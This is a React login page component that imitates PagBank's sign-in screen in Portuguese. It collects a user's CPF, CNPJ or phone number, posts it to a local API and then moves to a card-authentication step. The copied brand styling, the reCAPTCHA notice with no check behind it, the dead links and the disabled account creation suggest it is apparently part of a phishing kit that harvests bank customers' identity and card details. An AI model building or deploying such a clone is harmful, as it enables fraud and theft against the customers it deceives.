import { useState } from "react";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import FormattedInput from "@/components/FormattedInput";
import { formatDocument } from "@/lib/utils";

export default function LoginPage() {
  const [document, setDocument] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [, navigate] = useLocation();
  const { toast } = useToast();

  const handleContinue = async () => {
    if (!document.trim()) {
      setError("Por favor, digite um CPF, CNPJ ou telefone");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const cleanDocument = document.replace(/\D/g, "");
      const res = await apiRequest("POST", "/api/auth/login", { document: cleanDocument });
      
      if (res.ok) {
        navigate("/card-auth");
      }
    } catch (err) {
      console.error(err);
      setError("Usuário não encontrado ou ocorreu um erro de comunicação");
      toast({
        title: "Erro",
        description: "Ocorreu um erro ao tentar acessar a conta",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleCreateAccount = () => {
    toast({
      title: "Funcionalidade não disponível",
      description: "A criação de contas não está disponível neste momento",
    });
  };

  return (
    <div className="flex-grow flex flex-col items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <h1 className="text-2xl font-medium text-center mb-6">Acesse sua conta</h1>
        
        <div className="mb-4">
          <FormattedInput
            id="document-input"
            value={document}
            onChange={(value) => {
              setDocument(value);
              setError("");
            }}
            formatter={formatDocument}
            placeholder="CPF, CNPJ ou Telefone"
            className="pagbank-input"
            maxLength={18}
          />
          {error && <div className="text-red-500 text-sm mt-1">{error}</div>}
        </div>
        
        <button 
          className="pagbank-button-primary"
          onClick={handleContinue}
          disabled={isLoading}
        >
          {isLoading ? "Processando..." : "Continuar"}
        </button>
        
        <button 
          className="pagbank-button-secondary mt-4"
          onClick={handleCreateAccount}
          disabled={isLoading}
        >
          Criar conta
        </button>
        
        <div className="flex items-center text-primary mb-8 justify-center mt-6">
          <i className="mr-2">📱</i>
          <a href="#" className="pagbank-link">
            Comunicar perda ou roubo de celular
          </a>
          <i className="ml-2 text-xs">▶</i>
        </div>
        
        <div className="text-center text-sm text-gray-600 mb-2">
          Protegido por reCAPTCHA.
        </div>
        <div className="text-center mb-8">
          <a href="#" className="pagbank-link text-sm">Privacidade e Termos de Serviço</a>
        </div>
        
        <div className="flex items-center justify-center mb-6">
          <div className="h-px bg-gray-300 w-full"></div>
          <div className="px-4 text-gray-500 text-sm">ou</div>
          <div className="h-px bg-gray-300 w-full"></div>
        </div>
        
        <div className="text-center mb-4">
          <p className="text-gray-700 mb-4">Baixe o aplicativo PagBank</p>
          <button className="border border-primary text-primary rounded py-2 px-6 inline-block hover:bg-secondary transition">
            Baixar aplicativo
          </button>
        </div>
      </div>
    </div>
  );
}
